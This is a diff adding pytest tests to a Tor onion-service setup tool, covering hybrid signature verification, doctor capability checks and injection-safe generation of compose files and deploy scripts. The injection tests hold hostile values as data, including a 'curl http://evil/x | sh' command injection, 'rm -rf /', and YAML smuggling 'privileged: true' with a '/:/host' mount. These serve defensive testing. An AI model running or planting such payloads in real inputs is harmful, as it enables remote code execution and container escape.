@@ -6,8 +6,10 @@ test is the machine contract itself - stable JSON field names, exit codes, name
 validation (names become directories), and Tor v3 address derivation against a
 real mkp224o-generated vector.
 """
+import subprocess
 import json
 import os
+import shlex
 import stat
 import sys
 from pathlib import Path
@@ -829,3 +831,459 @@ def test_exit_codes_are_documented(hf):
     for code in ("0", "1", "2", "3", "4", "130"):
         assert code in m["exit_codes"]
     assert m["exit_codes"]["4"].startswith("not ready")
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# verify-image: half a hybrid signature is not a verified image
+# ─────────────────────────────────────────────────────────────────────────────
+
+def _signature_set(tmp_path, *, pub=True, sig=True):
+    d = tmp_path / "signatures"
+    d.mkdir()
+    (d / "hiddenforge.digest").write_text("sha256:" + "a" * 64 + "\n")
+    (d / "allowed-signers").write_text("sam@sambent.com ssh-ed25519 AAAA\n")
+    (d / "hiddenforge.digest.sig").write_text("-----BEGIN SSH SIGNATURE-----\n")
+    if pub:
+        (d / "sambent-mldsa.pub").write_bytes(b"\x00" * 1968)
+    if sig:
+        (d / "hiddenforge.digest.mldsa").write_bytes(b"\x00" * 3325)
+    return d
+
+
+def test_a_stripped_mldsa_public_key_is_a_failure_not_a_shrug(hf, tmp_path):
+    """The signature is one half of a hybrid scheme. Treating a missing half as
+    "nothing to report" lets an attacker downgrade it to a single classical
+    signature by deleting one file, while the tool still prints VERIFIED."""
+    sigdir = _signature_set(tmp_path, pub=False)
+    verdict, detail = hf._verify_mldsa_signature(sigdir)
+    assert verdict is False
+    assert "has been altered" in detail
+
+
+def test_a_stripped_mldsa_signature_is_a_failure_too(hf, tmp_path):
+    sigdir = _signature_set(tmp_path, sig=False)
+    verdict, detail = hf._verify_mldsa_signature(sigdir)
+    assert verdict is False
+    assert "has been altered" in detail
+
+
+def test_a_signature_set_with_no_post_quantum_half_is_not_checked(hf, tmp_path):
+    """An older set that never had one. Not a failure, but not silently fine
+    either: the caller is told it was not checked."""
+    sigdir = _signature_set(tmp_path, pub=False, sig=False)
+    verdict, detail = hf._verify_mldsa_signature(sigdir)
+    assert verdict is None
+    assert "carries no ML-DSA signature" in detail
+
+
+def test_a_missing_verifier_is_reported_as_not_checked(hf, tmp_path, monkeypatch):
+    sigdir = _signature_set(tmp_path)
+    monkeypatch.setattr(hf.shutil, "which",
+                        lambda name: None if name == "pqsign" else "/usr/bin/" + name)
+    verdict, detail = hf._verify_mldsa_signature(sigdir)
+    assert verdict is None
+    assert "NOT checked" in detail
+
+
+def test_an_unchecked_half_never_prints_a_bare_verified(hf, tmp_path, monkeypatch,
+                                                        capsys):
+    """The one line an operator reads before trusting an image. "VERIFIED" must
+    mean both halves were checked."""
+    sigdir = _signature_set(tmp_path, pub=False, sig=False)
+    monkeypatch.setattr(hf, "_verify_ssh_signature", lambda *a, **kw: (True, "ok"))
+    rc = hf.main(["verify-image", "example.com/x:1", "--sigdir", str(sigdir),
+                  "--skip-registry"])
+    out = capsys.readouterr().out
+    assert rc == 0
+    assert "VERIFIED, BUT NOT COMPLETELY" in out
+    assert "carries no ML-DSA signature" in out
+
+
+def test_a_fully_checked_image_says_verified_and_nothing_else(hf, tmp_path,
+                                                              monkeypatch, capsys):
+    """Guard against 'fixing' the above by qualifying every verdict."""
+    sigdir = _signature_set(tmp_path)
+    monkeypatch.setattr(hf, "_verify_ssh_signature", lambda *a, **kw: (True, "ok"))
+    monkeypatch.setattr(hf, "_verify_mldsa_signature", lambda sd: (True, "ok"))
+    rc = hf.main(["verify-image", "example.com/x:1", "--sigdir", str(sigdir),
+                  "--skip-registry"])
+    lines = capsys.readouterr().out.strip().splitlines()
+    assert rc == 0
+    assert lines[-1] == "VERIFIED"
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# setup: the key path lands in a compose file and a 0755 shell script
+# ─────────────────────────────────────────────────────────────────────────────
+#
+# `--image` and `--container` were validated and `--keys` was not, and `setup` is
+# the machine-facing adoption path: docs/INTEGRATION.md describes programs calling
+# it, so the value need not have been typed by the person who runs the result.
+
+def _yaml_or_fail():
+    """PyYAML, or a failure -- never a skip.
+
+    These two tests are the whole proof that a crafted `--keys` or `--container`
+    cannot smuggle `privileged: true` or `/:/host` into the fragment the operator
+    merges into their stack, and the only way to ask that question is to PARSE
+    the output. They used `pytest.importorskip`, so on a machine without PyYAML
+    they reported green while checking nothing.
+
+    That was not hypothetical. PyYAML was missing from requirements-ci, the CI
+    unit job skipped both, and the mutation spot-check caught it: the
+    container-escape mutation came back SURVIVED in CI and killed locally. A
+    guard that disappears when a dependency is absent is not a guard, so the
+    dependency is now pinned in requirements-ci.txt and its absence is an error.
+    """
+    try:
+        import yaml
+    except ImportError as exc:      # pragma: no cover - the point is it is loud
+        raise AssertionError(
+            "PyYAML is required to verify that the generated compose fragment "
+            "cannot be made to open a second key. Refusing to skip a "
+            "container-escape guard: pip install -r requirements-ci.txt"
+        ) from exc
+    return yaml
+
+
+def test_a_key_path_cannot_open_a_second_compose_key(hf):
+    """Reproduced before this was written: a crafted --keys produced a fragment
+    with `privileged: true` and `/:/host` in volumes -- a container escape,
+    written into a file the operator merges with their own compose.yml."""
+    yaml = _yaml_or_fail()
+    evil = ("/srv/keys:/var/lib/tor/hidden_service\n      - /:/host\n"
+            "    privileged: true\n    x: y")
+    frag = hf.render_compose_fragment({"app": ["80:127.0.0.1:8080"]}, "img:1",
+                                      evil, "tor")
+    svc = yaml.safe_load(frag)["services"]["tor"]
+    assert svc.get("privileged") is None
+    assert len(svc["volumes"]) == 1, svc["volumes"]
+    assert "/host" not in svc["volumes"][0].split(":")[-1]
+
+
+def test_a_key_path_cannot_inject_a_command_into_deploy_sh(hf):
+    """deploy.sh is written 0755 and the README tells the operator to run it."""
+    evil = '/srv/keys"; curl http://evil/x | sh; echo "'
+    out = hf.render_deploy_sh({"app": ["80:127.0.0.1:8080"]}, evil, "tor")
+    for line in out.splitlines():
+        stripped = line.strip()
+        if stripped.startswith(("mkdir", "chmod")):
+            # The payload may appear, but only inside single quotes as data.
+            assert stripped.count("'") >= 2, stripped
+            assert not stripped.endswith("| sh; echo \"\""), stripped
+
+
+def test_a_control_character_in_the_key_path_is_refused(hf):
+    """Quoting is the fix; this is the second half. A path carrying a newline is
+    not a path anyone meant to type, and refusing it keeps the generated files
+    readable as well as safe."""
+    with pytest.raises(ValueError, match="control character"):
+        hf.validate_keys_dir("/srv/keys\n      - /:/host")
+    with pytest.raises(ValueError, match="control character"):
+        hf.validate_keys_dir("/srv/keys\x00")
+    with pytest.raises(ValueError):
+        hf.validate_keys_dir("")
+
+
+def test_a_newline_in_the_key_path_adds_a_line_but_not_a_command(hf):
+    """The validator refuses this, so nothing production renders can reach here.
+
+    It is written down because the fuzz target asserted the opposite and crashed
+    on its second input: it compared LINE COUNTS, and a newline inside
+    `shlex.quote`'s single quotes adds a line while adding nothing executable.
+    The property that actually matters is that the script's WORDS do not change,
+    which is what `fuzz/fuzz_parsers.py` now asserts and what this pins down by
+    hand for the payload that exposed it.
+    """
+    services = {"app": ["80:127.0.0.1:8080"]}
+    benign = hf.render_deploy_sh(services, "/keys", "tor")
+    for payload in ("\n", "/k\n; curl http://evil/x | sh\n", "/k\nrm -rf /"):
+        with pytest.raises(ValueError, match="control character"):
+            hf.validate_keys_dir(payload)
+        rendered = hf.render_deploy_sh(services, payload, "tor")
+        assert len(rendered.splitlines()) > len(benign.splitlines())
+        got = shlex.split(rendered, comments=True)
+        want = shlex.split(benign, comments=True)
+        assert len(got) == len(want), (payload, len(want), len(got))
+        for got_word, want_word in zip(got, want, strict=True):
+            assert got_word == want_word or "/keys" in want_word, (
+                payload, want_word, got_word)
+        # And the result is still one syntactically valid script.
+        proc = subprocess.run(["bash", "-n", "-"], input=rendered, text=True,
+                              capture_output=True, check=False, timeout=30)
+        assert proc.returncode == 0, proc.stderr
+
+
+def test_an_ordinary_key_path_is_accepted_unchanged(hf):
+    """Guard against 'fixing' this by refusing paths people actually use."""
+    for good in ("./tor-keys", "/srv/onions/keys", "/mnt/My Keys/tor",
+                 "../shared/keys"):
+        assert hf.validate_keys_dir(good) == good
+
+
+def test_setup_refuses_an_injectable_key_path(hf, tmp_path, capsys):
+    rc = hf.main(["setup", "--backend", "web:80", "--name", "blog",
+                  "--keys", "/srv/k\n    privileged: true", "-o", str(tmp_path),
+                  "--json"])
+    capsys.readouterr()
+    assert rc != 0
+    assert not (tmp_path / "compose.service.yml").exists()
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# doctor: the capability requirement depends on the runtime
+# ─────────────────────────────────────────────────────────────────────────────
+
+def _doctor_checks(hf, monkeypatch, capsys, cap_add, rootless):
+    info = {"HostConfig": {"CapDrop": ["ALL"], "CapAdd": list(cap_add),
+                           "SecurityOpt": ["no-new-privileges:true"],
+                           "ReadonlyRootfs": True, "PidsLimit": 128},
+            "State": {"Running": True, "Health": {"Status": "healthy"}},
+            "Config": {"Image": "img"}}
+    monkeypatch.setattr(hf, "_docker_inspect", lambda c: (info, None))
+    monkeypatch.setattr(hf, "_resolve_container", lambda c: "cid")
+    monkeypatch.setattr(hf, "_engine", lambda: "podman" if rootless else "docker")
+    monkeypatch.setattr(hf, "_is_rootless", lambda: rootless)
+    monkeypatch.setattr(hf, "_docker_exec_json", lambda c, a: None)
+    monkeypatch.setattr(hf, "_docker_exec_text", lambda c, a: None)
+    monkeypatch.setattr(hf, "_run", lambda cmd, **kw: subprocess.CompletedProcess(
+        cmd, 1, "", ""))
+    hf.main(["doctor", "--container", "tor", "--keys", "/nonexistent", "--json"])
+    doc = json.loads(capsys.readouterr().out)
+    return {c["check"]: c for c in doc["checks"]}
+
+
+def test_doctor_does_not_fail_the_shipped_podman_capability_set(hf, monkeypatch,
+                                                                capsys):
+    """podman-compose.yml grants three capabilities, not five, because under
+    rootless Podman container root maps to the invoking host user and the bind
+    mount is already writable. `doctor` demanded all five on every runtime, so it
+    reported FAILED for a container started from this project's own compose file,
+    on the runtime the deployed instance uses. A check that fails on the
+    recommended configuration teaches operators to ignore it."""
+    checks = _doctor_checks(hf, monkeypatch, capsys,
+                            ["CHOWN", "SETUID", "SETGID"], rootless=True)
+    assert checks["cap_add includes every required capability"]["ok"] is True
+
+
+def test_doctor_still_demands_all_five_under_rootful_docker(hf, monkeypatch, capsys):
+    """The other half. Rootful Docker genuinely needs DAC_OVERRIDE and FOWNER to
+    prepare a host-owned key volume, and a missing one is a container that cannot
+    start its services."""
+    checks = _doctor_checks(hf, monkeypatch, capsys,
+                            ["CHOWN", "SETUID", "SETGID"], rootless=False)
+    check = checks["cap_add includes every required capability"]
+    assert check["ok"] is False
+    assert "DAC_OVERRIDE" in check["detail"] and "FOWNER" in check["detail"]
+
+
+def test_doctor_still_refuses_capabilities_outside_the_ceiling(hf, monkeypatch,
+                                                               capsys):
+    """Rootless does not mean anything goes: a capability nobody asked for is a
+    finding on either runtime."""
+    for rootless in (True, False):
+        checks = _doctor_checks(hf, monkeypatch, capsys,
+                                ["CHOWN", "SETUID", "SETGID", "SYS_ADMIN"],
+                                rootless=rootless)
+        check = checks["cap_add stays within the allowed set"]
+        assert check["ok"] is False, rootless
+        assert "SYS_ADMIN" in check["detail"]
+
+
+def test_rootlessness_is_asked_not_assumed(hf, monkeypatch):
+    """And a query that cannot answer leaves the strict requirement in force, so
+    a broken engine can only make doctor stricter."""
+    monkeypatch.setattr(hf, "_engine", lambda: "podman")
+    monkeypatch.setattr(hf, "_run", lambda cmd, **kw: subprocess.CompletedProcess(
+        cmd, 0, "true\n", ""))
+    assert hf._is_rootless() is True
+    monkeypatch.setattr(hf, "_run", lambda cmd, **kw: subprocess.CompletedProcess(
+        cmd, 0, "false\n", ""))
+    assert hf._is_rootless() is False
+    monkeypatch.setattr(hf, "_run", lambda cmd, **kw: subprocess.CompletedProcess(
+        cmd, 125, "", "no such command"))
+    assert hf._is_rootless() is False
+    monkeypatch.setattr(hf, "_engine", lambda: None)
+    assert hf._is_rootless() is False
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# show: an address the container will not serve
+# ─────────────────────────────────────────────────────────────────────────────
+
+def test_a_hostname_that_disagrees_with_the_public_key_is_reported(hf, tmp_path):
+    """The public key IS the address. A hostname file saying something else means
+    the key set is inconsistent -- a partial restore, or files from two services
+    in one directory -- and Tor rewrites `hostname` from the key at startup, so it
+    serves the DERIVED address while the operator publishes the reported one.
+
+    This project has already shipped an address nothing could reach once. An
+    address the container will not serve is the same mistake in a different
+    place, so `show` says so rather than picking a side.
+    """
+    d = tmp_path / "app"
+    d.mkdir()
+    (d / "hs_ed25519_public_key").write_bytes(
+        PUBLIC_TAG.ljust(32, b"\x00") + bytes.fromhex(VECTOR_PUB_HEX))
+    (d / "hostname").write_text("b" * 56 + ".onion\n")
+    entry = hf.address_for(tmp_path, "app")
+    assert entry["source"] == "hostname"
+    assert entry["onion"] == "b" * 56 + ".onion"
+    assert entry["derived_matches"] is False
+
+
+def test_an_agreeing_key_set_says_so(hf, tmp_path):
+    """Guard against reporting every key set as inconsistent."""
+    d = tmp_path / "app"
+    d.mkdir()
+    (d / "hs_ed25519_public_key").write_bytes(
+        PUBLIC_TAG.ljust(32, b"\x00") + bytes.fromhex(VECTOR_PUB_HEX))
+    (d / "hostname").write_text(VECTOR_ONION + "\n")
+    entry = hf.address_for(tmp_path, "app")
+    assert entry["derived_matches"] is True
+    assert entry["onion"] == VECTOR_ONION
+
+
+def test_no_public_key_means_could_not_tell_not_fine(hf, tmp_path):
+    """None, not False: "we could not check" and "it disagrees" are different
+    answers, and only one of them is a fault."""
+    d = tmp_path / "app"
+    d.mkdir()
+    (d / "hostname").write_text(VECTOR_ONION + "\n")
+    entry = hf.address_for(tmp_path, "app")
+    assert entry["derived_matches"] is None
+    assert entry["onion"] == VECTOR_ONION
+
+
+def test_doctor_fails_a_key_set_whose_hostname_disagrees(hf, tmp_path):
+    d = tmp_path / "app"
+    d.mkdir(mode=0o700)
+    (d / "hs_ed25519_public_key").write_bytes(
+        PUBLIC_TAG.ljust(32, b"\x00") + bytes.fromhex(VECTOR_PUB_HEX))
+    (d / "hs_ed25519_secret_key").write_bytes(b"\x00" * 96)
+    (d / "hostname").write_text("b" * 56 + ".onion\n")
+    for p in d.iterdir():
+        os.chmod(p, 0o600)
+    checks: list = []
+    hf._append_key_checks(checks, tmp_path)
+    failed = [c for c in checks if not c["ok"]]
+    assert any("matches the public key" in c["check"] for c in failed), checks
+
+
+def test_a_container_name_cannot_open_a_second_compose_service(hf):
+    """The same hole as the key path, one interpolation over, in the same file.
+    `--container` becomes a YAML KEY (`  {container}:`). Reproduced before this
+    test: a crafted name put `privileged: true` on the tor service and added a
+    second service beside it."""
+    yaml = _yaml_or_fail()
+    evil = "tor:\n    privileged: true\n  other"
+    with pytest.raises(ValueError, match="invalid container name"):
+        hf.validate_container(evil)
+    # And the generator quotes it for the shell regardless of validation.
+    sh = hf.render_deploy_sh({"app": ["80:127.0.0.1:8080"]}, "/keys",
+                             'tor"; id; echo "')
+    for line in sh.splitlines():
+        if "exec -T" in line:
+            assert line.count("'") >= 2, line
+    frag = hf.render_compose_fragment({"app": ["80:127.0.0.1:8080"]}, "img:1",
+                                      "/keys", "tor")
+    assert sorted(yaml.safe_load(frag)["services"]) == ["tor"]
+
+
+def test_setup_refuses_an_injectable_container_name(hf, tmp_path, capsys):
+    rc = hf.main(["setup", "--backend", "web:80", "--name", "blog",
+                  "--container", "tor\n    privileged: true", "-o", str(tmp_path),
+                  "--json"])
+    capsys.readouterr()
+    assert rc != 0
+    assert not (tmp_path / "compose.service.yml").exists()
+
+
+def test_setup_refuses_an_out_of_range_onion_port(hf, tmp_path, capsys):
+    """Emitting it anyway writes a compose file whose service the container drops
+    at boot, with the reason only in a log the shipped compose file discards."""
+    rc = hf.main(["setup", "--backend", "web:80", "--name", "blog",
+                  "--onion-port", "99999", "-o", str(tmp_path), "--json"])
+    capsys.readouterr()
+    assert rc != 0
+    assert not (tmp_path / "compose.service.yml").exists()
+
+
+def test_setup_still_accepts_the_ordinary_arguments(hf, tmp_path, capsys):
+    """Guard against 'fixing' this by refusing what people actually type."""
+    rc = hf.main(["setup", "--backend", "web:80", "--name", "blog",
+                  "--container", "my-tor_1.sidecar", "--onion-port", "443",
+                  "-o", str(tmp_path), "--json"])
+    capsys.readouterr()
+    assert rc == 0
+    assert (tmp_path / "compose.service.yml").exists()
+
+
+def test_verify_image_is_ok_but_not_complete_without_pqsign(hf, tmp_path, capsys,
+                                                            monkeypatch):
+    """`ok` answers "did anything that ran fail", not "was everything checked".
+
+    The human output has always distinguished the two -- VERIFIED versus
+    VERIFIED, BUT NOT COMPLETELY -- while the JSON offered only `ok`. A deploy
+    gate keying on it would ship an image whose post-quantum half was never
+    verified, because pqsign happened not to be installed on the runner. That is
+    the signature-stripping downgrade arriving through the verifier's own
+    reporting rather than through the signature.
+    """
+    d = _sigdir(tmp_path)
+    monkeypatch.setattr(hf, "_resolve_registry_digest", lambda i: ("sha256:abc", None))
+    monkeypatch.setattr(hf, "_verify_ssh_signature", lambda s, i, b: (True, "Good"))
+    monkeypatch.setattr(hf, "_verify_mldsa_signature",
+                        lambda s: (None, "pqsign not installed"))
+    rc = hf.main(["verify-image", "example/img:1", "--sigdir", str(d), "--json"])
+    doc = json.loads(capsys.readouterr().out)
+    assert rc == 0
+    assert doc["ok"] is True
+    assert doc["complete"] is False, "a half-checked hybrid signature is not complete"
+    assert any("ML-DSA" in u for u in doc["unchecked"])
+
+
+def test_verify_image_is_complete_when_both_halves_verified(hf, tmp_path, capsys,
+                                                            monkeypatch):
+    """The other side: a fully checked image must not be reported as partial."""
+    d = _sigdir(tmp_path)
+    monkeypatch.setattr(hf, "_resolve_registry_digest", lambda i: ("sha256:abc", None))
+    monkeypatch.setattr(hf, "_verify_ssh_signature", lambda s, i, b: (True, "Good"))
+    monkeypatch.setattr(hf, "_verify_mldsa_signature", lambda s: (True, "ok"))
+    rc = hf.main(["verify-image", "example/img:1", "--sigdir", str(d), "--json"])
+    doc = json.loads(capsys.readouterr().out)
+    assert rc == 0
+    assert doc["ok"] is True and doc["complete"] is True
+    assert doc["unchecked"] == []
+
+
+def test_an_unreachable_registry_fails_rather_than_reducing_to_signatures(
+        hf, tmp_path, capsys, monkeypatch):
+    """Without --skip-registry the digest comparison is a declared step.
+
+    Checked while adding `complete`: a registry that cannot be reached is already
+    a hard failure here, not a quiet downgrade to "the signatures were fine". It
+    therefore does not belong in `unchecked` -- it belongs in `failures`, which
+    is where it is. Pinned so a later refactor cannot soften it into a warning.
+    """
+    d = _sigdir(tmp_path)
+    monkeypatch.setattr(hf, "_resolve_registry_digest",
+                        lambda i: (None, "registry unreachable"))
+    monkeypatch.setattr(hf, "_verify_ssh_signature", lambda s, i, b: (True, "Good"))
+    monkeypatch.setattr(hf, "_verify_mldsa_signature", lambda s: (True, "ok"))
+    rc = hf.main(["verify-image", "example/img:1", "--sigdir", str(d), "--json"])
+    doc = json.loads(capsys.readouterr().out)
+    assert rc == hf.EXIT_FAIL
+    assert doc["ok"] is False and doc["complete"] is False
+    assert any("registry" in f for f in doc["failures"])
+
+
+def test_a_failed_verification_is_never_complete(hf, tmp_path, capsys, monkeypatch):
+    d = _sigdir(tmp_path)
+    monkeypatch.setattr(hf, "_resolve_registry_digest", lambda i: ("sha256:abc", None))
+    monkeypatch.setattr(hf, "_verify_ssh_signature", lambda s, i, b: (False, "bad sig"))
+    monkeypatch.setattr(hf, "_verify_mldsa_signature", lambda s: (True, "ok"))
+    rc = hf.main(["verify-image", "example/img:1", "--sigdir", str(d), "--json"])
+    doc = json.loads(capsys.readouterr().out)
+    assert rc == hf.EXIT_FAIL
+    assert doc["ok"] is False and doc["complete"] is False
